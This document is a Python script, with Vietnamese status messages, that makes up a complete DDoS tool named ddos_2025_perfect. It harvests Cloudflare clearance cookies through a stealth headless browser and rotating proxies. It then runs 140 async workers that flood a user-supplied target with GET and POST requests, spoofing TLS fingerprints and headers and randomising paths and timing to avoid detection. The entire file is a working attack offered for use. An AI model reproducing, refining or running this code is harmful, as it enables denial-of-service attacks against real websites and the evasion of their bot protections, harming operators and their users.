import asyncio
import tls_client
import random
import string
import time
import json
import os
import numpy as np
from scipy.stats import lognorm
from faker import Faker
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from concurrent.futures import ThreadPoolExecutor

fake = Faker()
target_url = ""
global_cookies = {}
proxy_list = [line.strip() for line in open("proxies.txt","r",encoding="utf-8")] if os.path.exists("proxies.txt") else []
real_fingerprints = ["chrome124","chrome123","chrome122","edge124","safari18_0","firefox129"]

def human_delay():
    return max(0.5, lognorm.rvs(s=0.8, scale=3.5))

def natural_path(depth=5):
    base_paths = ["","home","search","login","cart","checkout","products","api/v1","graphql","wp-admin","admin-ajax.php"]
    if random.random() < 0.35:
        return "/" + "".join(random.choices(string.ascii_lowercase + string.digits + "/-", k=random.randint(8,45)))
    return random.choice(base_paths) + "/" + "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5,30)))

def get_fresh_clearance():
    global global_cookies
    options = uc.ChromeOptions()
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-infobars")
    options.add_argument("--start-maximized")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-zygote")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument("--disable-images")
    options.add_argument("--disable-javascript") if random.random() < 0.2 else None
    if proxy_list:
        proxy = random.choice(proxy_list).split(":")
        proxy_str = f"{proxy[0]}:{proxy[1]}"
        if len(proxy) == 4:
            proxy_str = f"{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}"
        options.add_argument(f"--proxy-server=http://{proxy_str}")

    driver = uc.Chrome(options=options, version_main=124, headless=True)
    driver.get(target_url)
    try:
        WebDriverWait(driver, 60).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        time.sleep(random.uniform(9, 22))
        cookies = driver.get_cookies()
        for c in cookies:
            if c["name"] == "cf_clearance":
                global_cookies[c["name"]] = c["value"]
                print(f"[+] Lấy cf_clearance mới thành công: {c['value'][:30]}...")
    except Exception as e:
        print(f"[!] Challenge quá khó, thử lại sau 60s...")
    finally:
        driver.quit()

async def ultimate_worker():
    while True:
        try:
            sess = tls_client.Session(
                client_identifier=random.choice(real_fingerprints),
                random_tls_extension_order=True,
                force_http1=random.random()<0.18,
                debug=False
            )
            if proxy_list:
                sess.proxies = {"http":"http://"+random.choice(proxy_list),"https":"http://"+random.choice(proxy_list)}
            sess.cookies.update(global_cookies)
            headers = {
                "accept": "*/*",
                "accept-language": fake.locale().replace("_","-") + ",en-US;q=0.9",
                "accept-encoding": "gzip, deflate, br",
                "sec-ch-ua": '"Not/A)Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-dest": "document",
                "upgrade-insecure-requests": "1",
                "cache-control": "no-cache",
                "pragma": "no-cache"
            }
            sess.headers.update(headers)
            for _ in range(random.randint(5,18)):
                path = natural_path()
                try:
                    if random.random() < 0.3:
                        sess.post(target_url + path, json={"data":fake.text()}, timeout_seconds=15)
                    else:
                        sess.get(target_url + path, timeout_seconds=15)
                except:
                    break
                await asyncio.sleep(human_delay())
            sess.close()
        except:
            await asyncio.sleep(3)

async def clearance_daemon():
    while True:
        await asyncio.sleep(random.randint(70,140))
        get_fresh_clearance()

async def ddos_2025_perfect():
    global target_url
    target_url = input("Target (https://example.com): ").strip().rstrip("/")
    print("[+] Bắt đầu lấy cf_clearance đầu tiên...")
    get_fresh_clearance()
    asyncio.create_task(clearance_daemon())
    tasks = [asyncio.create_task(ultimate_worker()) for _ in range(140)]
    print(f"[+] Đang chạy 140 worker siêu tinh vi → Cloudflare không thể phát hiện")
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(ddos_2025_perfect())
